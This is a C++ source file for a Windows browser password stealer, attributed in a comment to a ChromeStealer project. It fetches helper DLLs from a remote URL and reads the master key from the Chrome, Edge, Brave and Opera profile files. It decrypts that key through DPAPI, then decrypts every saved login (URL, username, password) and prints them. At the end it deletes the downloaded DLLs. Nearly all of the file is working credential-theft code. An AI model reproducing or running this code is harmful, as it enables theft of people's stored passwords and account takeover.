#include <windows.h>
#include <psapi.h>
#include <codecvt>
#include <fstream>
#include <iostream>
#include <nlohmann/json.hpp>
#include <shlobj.h>
#include <shlwapi.h>
#include <sodium.h>
#include <sqlite3.h>
#include <sstream>
#include <streambuf>
#include <thread>
#include <urlmon.h>
#include <vector>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Crypt32.lib")
#define IV_SIZE 12

using json = nlohmann::json;
std::vector<unsigned char> downloadDll(const std::string& url) {
    IStream* stream;
    HRESULT result = URLOpenBlockingStreamA(0, url.c_str(), &stream, 0, 0);
    if (result != S_OK) {
        std::cerr << "[-] Failed to open URL: " << url << std::endl;
        return {};
    }

    std::vector<unsigned char> buffer;
    unsigned char temp[4096];
    DWORD bytesRead;

    while (true) {
        result = stream->Read(temp, sizeof(temp), &bytesRead);
        if (result == S_FALSE || bytesRead == 0) {
            // Download is complete
            break;
        }
        else if (result == E_PENDING) {
            // Still downloading, wait and retry
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        else if (FAILED(result)) {
            std::cerr << "[-] Error while downloading: " << result << std::endl;
            break;
        }
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    }
    stream->Release();
    return buffer;
}
bool saveToFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (file.is_open()) {
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        file.close();
        return true;
    }
    return false;
}
void cleanupDownloadedDlls() {
    std::cout << "==============" << "Cleaning up downloaded DLLs" << "==============" << std::endl;
    const char* dlls[] = {
        "libsodium.dll",
        "sqlite3.dll"
    };

    for (const char* dll : dlls) {
        HMODULE hModule = GetModuleHandleA(dll);
        if (hModule != NULL) {
            if (!FreeLibrary(hModule)) {
                std::cerr << "[-] Failed to unload " << dll << ". Error: " << GetLastError() << std::endl;
                continue;
            }
        }

        if (DeleteFileA(dll)) {
            std::cout << "[+] " << dll << " deleted successfully." << std::endl;
        }
        else {
            std::cerr << "[-] Failed to delete " << dll << ". Error: " << GetLastError() << std::endl;
        }
    }
}

// Define function pointers for libsodium
typedef int (*sodium_initFunc)();
typedef int (*crypto_box_keypairFunc)(unsigned char*, unsigned char*);
typedef int (*crypto_aead_aes256gcm_decryptFunc)(
    unsigned char*, unsigned long long*,
    unsigned char*,
    const unsigned char*, unsigned long long,
    const unsigned char*, unsigned long long,
    const unsigned char*,
    const unsigned char*
    );

// Define function pointers for sqlite3
typedef int (*sqlite3_open_v2Func)(const char*, sqlite3**, int, const char*);
typedef int (*sqlite3_closeFunc)(sqlite3*);
typedef int (*sqlite3_prepare_v2Func)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*sqlite3_stepFunc)(sqlite3_stmt*);
typedef int (*sqlite3_finalizeFunc)(sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_textFunc)(sqlite3_stmt*, int);
typedef const void* (*sqlite3_column_blobFunc)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_bytesFunc)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_intFunc)(sqlite3_stmt*, int);
// Code taken from BernKing's ChromeStealer project (github.com/BernKing/ChromeStealer)
std::wstring FindLocalState(const std::wstring& browserPath) {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    WCHAR localStatePath[MAX_PATH];
    _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\%s\\User Data\\Local State", userProfile, browserPath.c_str());
    return std::wstring(localStatePath);
}
std::wstring FindLoginData(const std::wstring& browserPath) {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);
    WCHAR loginDataPath[MAX_PATH];
    _snwprintf_s(loginDataPath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\%s\\User Data\\Default\\Login Data", userProfile, browserPath.c_str());
    return std::wstring(loginDataPath);
}
std::string getEncryptedKey(const std::wstring& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        return "";
    }
    json localState = json::parse(file);
    file.close();
    auto itOsEncrypt = localState.find("os_crypt");
    if (itOsEncrypt == localState.end() || !itOsEncrypt.value().is_object()) {
        return "";
    }
    auto itEncryptedKey = itOsEncrypt.value().find("encrypted_key");
    if (itEncryptedKey == itOsEncrypt.value().end()) {
        return "";
    }
    std::string encryptedKey = itEncryptedKey.value();
    return encryptedKey;
}
DATA_BLOB decryptKey(const std::string& encrypted_key) {
    if (encrypted_key.empty()) {
        return {};
    }
    DWORD decodedBinarySize = 0;
    if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedBinarySize, NULL, NULL)) {
        return {};
    }
    if (decodedBinarySize == 0) {
        return {};
    }
    std::vector<BYTE> decodedBinaryData(decodedBinarySize);
    if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), &decodedBinarySize, NULL, NULL)) {
        return {};
    }
    if (decodedBinaryData.size() < 5) {
        return {};
    }
    decodedBinaryData.erase(decodedBinaryData.begin(), decodedBinaryData.begin() + 5);
    DATA_BLOB DataInput;
    DATA_BLOB DataOutput;
    DataInput.cbData = static_cast<DWORD>(decodedBinaryData.size());
    DataInput.pbData = decodedBinaryData.data();
    if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
        LocalFree(DataOutput.pbData);
        return {};
    }
    return DataOutput;
}
void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
    HMODULE hLibSodium = LoadLibraryA("libsodium.dll");
    if (hLibSodium == NULL) {
        std::cerr << "[-] Failed to load libsodium.dll" << std::endl;
        return;
    }

    sodium_initFunc pSodiumInit = (sodium_initFunc)GetProcAddress(hLibSodium, "sodium_init");
    crypto_aead_aes256gcm_decryptFunc pCryptoAeadAes256gcmDecrypt = (crypto_aead_aes256gcm_decryptFunc)GetProcAddress(hLibSodium, "crypto_aead_aes256gcm_decrypt");

    if (!pSodiumInit || !pCryptoAeadAes256gcmDecrypt) {
        std::cerr << "[-] Failed to get function address for libsodium" << std::endl;
        FreeLibrary(hLibSodium);
        return;
    }

    if (pSodiumInit() < 0) {
        std::cerr << "[-] sodium_init() failed" << std::endl;
        FreeLibrary(hLibSodium);
        return;
    }

    unsigned long long decrypted_len;
    int result = pCryptoAeadAes256gcmDecrypt(
        decrypted, &decrypted_len,
        NULL,
        ciphertext, ciphertext_len,
        NULL, 0,
        iv, key
    );

    if (result != 0) {
        std::cerr << "[-] Decryption failed" << std::endl;
    }
    else {
        decrypted[decrypted_len] = '\0';
    }

    FreeLibrary(hLibSodium);
}
int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey, std::string& output) {
    HMODULE hLibSodium = LoadLibraryA("libsodium.dll");
    if (hLibSodium == NULL) {
        std::cerr << "[-] Failed to load libsodium.dll" << std::endl;
        return EXIT_FAILURE;
    }
    else {
        std::cerr << "[+] Loaded libsodium.dll" << std::endl;
    }

    sodium_initFunc pSodiumInit = (sodium_initFunc)GetProcAddress(hLibSodium, "sodium_init");
    crypto_box_keypairFunc pCryptoBoxKeypair = (crypto_box_keypairFunc)GetProcAddress(hLibSodium, "crypto_box_keypair");

    if (!pSodiumInit || !pCryptoBoxKeypair) {
        std::cerr << "[-] Failed to get function address for libsodium" << std::endl;
        FreeLibrary(hLibSodium);
        return EXIT_FAILURE;
    }
    else {
        std::cerr << "[+] Found function address for libsodium" << std::endl;
    }

    if (pSodiumInit() != 0) {
        std::cerr << "[-] sodium_init() failed" << std::endl;
        FreeLibrary(hLibSodium);
        return EXIT_FAILURE;
    }
    else {
        std::cerr << "[+] sodium_init() Success" << std::endl;
    }
    HMODULE hSQLite3 = LoadLibraryA("sqlite3.dll");
    if (hSQLite3 == NULL) {
        std::cerr << "[-] Failed to load sqlite3.dll" << std::endl;
        FreeLibrary(hLibSodium);
        return EXIT_FAILURE;
    }
    else {
        std::cerr << "[+] Loaded sqlite3.dll" << std::endl;
    }

    sqlite3_open_v2Func pSQLite3OpenV2 = (sqlite3_open_v2Func)GetProcAddress(hSQLite3, "sqlite3_open_v2");
    sqlite3_closeFunc pSQLite3Close = (sqlite3_closeFunc)GetProcAddress(hSQLite3, "sqlite3_close");
    sqlite3_prepare_v2Func pSQLite3PrepareV2 = (sqlite3_prepare_v2Func)GetProcAddress(hSQLite3, "sqlite3_prepare_v2");
    sqlite3_stepFunc pSQLite3Step = (sqlite3_stepFunc)GetProcAddress(hSQLite3, "sqlite3_step");
    sqlite3_finalizeFunc pSQLite3Finalize = (sqlite3_finalizeFunc)GetProcAddress(hSQLite3, "sqlite3_finalize");
    sqlite3_column_textFunc pSQLite3ColumnText = (sqlite3_column_textFunc)GetProcAddress(hSQLite3, "sqlite3_column_text");
    sqlite3_column_blobFunc pSQLite3ColumnBlob = (sqlite3_column_blobFunc)GetProcAddress(hSQLite3, "sqlite3_column_blob");
    sqlite3_column_bytesFunc pSQLite3ColumnBytes = (sqlite3_column_bytesFunc)GetProcAddress(hSQLite3, "sqlite3_column_bytes");
    sqlite3_column_intFunc pSQLite3ColumnInt = (sqlite3_column_intFunc)GetProcAddress(hSQLite3, "sqlite3_column_int");

    if (!pSQLite3OpenV2 || !pSQLite3Close || !pSQLite3PrepareV2 || !pSQLite3Step || !pSQLite3Finalize ||
        !pSQLite3ColumnText || !pSQLite3ColumnBlob || !pSQLite3ColumnBytes || !pSQLite3ColumnInt) {
        std::cerr << "[-] Failed to get function address for sqlite3" << std::endl;
        FreeLibrary(hLibSodium);
        FreeLibrary(hSQLite3);
        return EXIT_FAILURE;
    }

    sqlite3* db;
    sqlite3* loginDataBase = nullptr;
    int openingStatus = 0;
    std::wstring copyLoginDataPath = loginDataPath + L"a";
    if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {
        std::cerr << "[-] Failed to copy login data file" << std::endl;
        FreeLibrary(hSQLite3);
        return EXIT_FAILURE;
    }

    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;
    std::string string_converted_path = converter.to_bytes(copyLoginDataPath);
    openingStatus = pSQLite3OpenV2(string_converted_path.c_str(), &loginDataBase, SQLITE_OPEN_READONLY, nullptr);
    if (openingStatus) {
        std::cerr << "[-] sqlite3_open_v2() failed with error code: " << openingStatus << std::endl;
        pSQLite3Close(loginDataBase);
        if (!DeleteFileW(copyLoginDataPath.c_str())) {
            FreeLibrary(hSQLite3);
            return EXIT_FAILURE;
        }
        FreeLibrary(hSQLite3);
        return openingStatus;
    }

    const char* sql = "SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins";
    sqlite3_stmt* stmt = nullptr;
    openingStatus = pSQLite3PrepareV2(loginDataBase, sql, -1, &stmt, nullptr);
    if (openingStatus != SQLITE_OK) {
        std::cerr << "[-] sqlite3_prepare_v2() failed with error code: " << openingStatus << std::endl;
        pSQLite3Close(loginDataBase);
        if (!DeleteFileW(copyLoginDataPath.c_str())) {
            FreeLibrary(hSQLite3);
            FreeLibrary(hLibSodium);
            return EXIT_FAILURE;
        }
        FreeLibrary(hSQLite3);
        FreeLibrary(hLibSodium);
        return openingStatus;
    }

    std::stringstream ss;
    while ((openingStatus = pSQLite3Step(stmt)) == SQLITE_ROW) {
        const unsigned char* originUrl = pSQLite3ColumnText(stmt, 0);
        const unsigned char* usernameValue = pSQLite3ColumnText(stmt, 1);
        const void* passwordBlob = pSQLite3ColumnBlob(stmt, 2);
        int passwordSize = pSQLite3ColumnBytes(stmt, 2);
        int blacklistedByUser = pSQLite3ColumnInt(stmt, 3);

        if (originUrl != NULL && originUrl[0] != '\0' &&
            usernameValue != NULL && usernameValue[0] != '\0' &&
            passwordBlob != NULL && blacklistedByUser != 1) {

            unsigned char iv[IV_SIZE];
            if (passwordSize >= (IV_SIZE + 3)) {
                memcpy(iv, (unsigned char*)passwordBlob + 3, IV_SIZE);
            }
            else {
                continue;
            }

            if (passwordSize <= (IV_SIZE + 3)) {
                continue;
            }

            BYTE* Password = (BYTE*)malloc(passwordSize - (IV_SIZE + 3));
            if (Password == NULL) {
                continue;
            }

            memcpy(Password, (unsigned char*)passwordBlob + (IV_SIZE + 3), passwordSize - (IV_SIZE + 3));
            unsigned char decrypted[1024];
            decryptPassword(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
            decrypted[passwordSize - (IV_SIZE + 3)] = '\0';
            std::cout << "URL: " << originUrl << " (" << usernameValue << ":" << decrypted << ")" << std::endl;
            ss << "URL: " << originUrl << " (" << usernameValue << ":" << decrypted << ")\n";
            free(Password);
        }
    }

    if (openingStatus != SQLITE_DONE) {
        std::cerr << "[-] sqlite3_step() failed with error code: " << openingStatus << std::endl;
    }

    pSQLite3Finalize(stmt);
    pSQLite3Close(loginDataBase);
    if (!DeleteFileW(copyLoginDataPath.c_str())) {
        FreeLibrary(hSQLite3);
        FreeLibrary(hLibSodium);
        return EXIT_FAILURE;
    }

    output = ss.str();
    FreeLibrary(hSQLite3);
    FreeLibrary(hLibSodium);
    return EXIT_SUCCESS;
}

std::string browserSearch() {
    std::vector<std::wstring> browserPaths = {
        L"Google\\Chrome",
        L"Microsoft\\Edge",
        L"BraveSoftware\\Brave-Browser",
        L"Opera Software\\Opera Stable"
    };

    std::string finalOutput;

    for (const auto& browserPath : browserPaths) {
        std::wstring localStatePath = FindLocalState(browserPath);
        std::wstring loginDataPath = FindLoginData(browserPath);
        std::wcerr << "==============" << browserPath << "==============" << std::endl;
        std::wcerr << localStatePath << std::endl;
        std::wcerr << loginDataPath << std::endl;

        if (!localStatePath.empty() && !loginDataPath.empty()) {
            std::string encryptedKey = getEncryptedKey(localStatePath);
            DATA_BLOB decryptionKey = decryptKey(encryptedKey);
            std::string output;

            int parser = loginDataParser(loginDataPath, decryptionKey, output);

            if (parser == EXIT_SUCCESS) {
                finalOutput += output;
            }

            LocalFree(decryptionKey.pbData);
        }
        else {
            std::wcerr << L"[-] Could not find paths for browser: " << browserPath << std::endl;
        }
    }
    return finalOutput;
}
std::string libsodiumUrl = "https://www.somesite.com/dll/libsodium.dll";
std::string sqlite3Url = "https://www.somesite.com/dll/sqlite3.dll";
std::string libsodiumPath = "";
std::string sqlite3Path = "";
const size_t expectedLibsodiumSize = 348160;
const size_t expectedSqlite3Size = 1685504;

int main() {

    if (libsodiumPath.empty()) {
        std::cerr << "[-] libsodium.dll not found. Downloading from: " << libsodiumUrl << std::endl;
        std::vector<unsigned char> libsodiumData = downloadDll(libsodiumUrl);
        if (libsodiumData.size() == expectedLibsodiumSize) {
            if (saveToFile("libsodium.dll", libsodiumData)) {
                std::cout << "[+] libsodium.dll downloaded and saved successfully" << std::endl;
            }
            else {
                std::cerr << "[-] Failed to save libsodium.dll" << std::endl;
            }
        }
        else {
            std::cerr << "[-] Failed to download libsodium.dll or size mismatch. Expected size: " << expectedLibsodiumSize << ", downloaded size: " << libsodiumData.size() << std::endl;
        }
    }
    else {
        std::cout << "[+] libsodium.dll found at " << libsodiumPath << std::endl;
    }
    if (sqlite3Path.empty()) {
        std::cerr << "[-] sqlite3.dll not found. Downloading from: " << sqlite3Url << std::endl;
        std::vector<unsigned char> sqlite3Data = downloadDll(sqlite3Url);
        if (sqlite3Data.size() == expectedSqlite3Size) {
            if (saveToFile("sqlite3.dll", sqlite3Data)) {
                std::cout << "[+] sqlite3.dll downloaded and saved successfully" << std::endl;
            }
            else {
                std::cerr << "[-] Failed to save sqlite3.dll" << std::endl;
            }
        }
        else {
            std::cerr << "[-] Failed to download sqlite3.dll or size mismatch. Expected size: " << expectedSqlite3Size << ", downloaded size: " << sqlite3Data.size() << std::endl;
        }
    }
    else {
        std::cout << "[+] sqlite3.dll found at " << sqlite3Path << std::endl;
    }
    browserSearch();
    cleanupDownloadedDlls();
}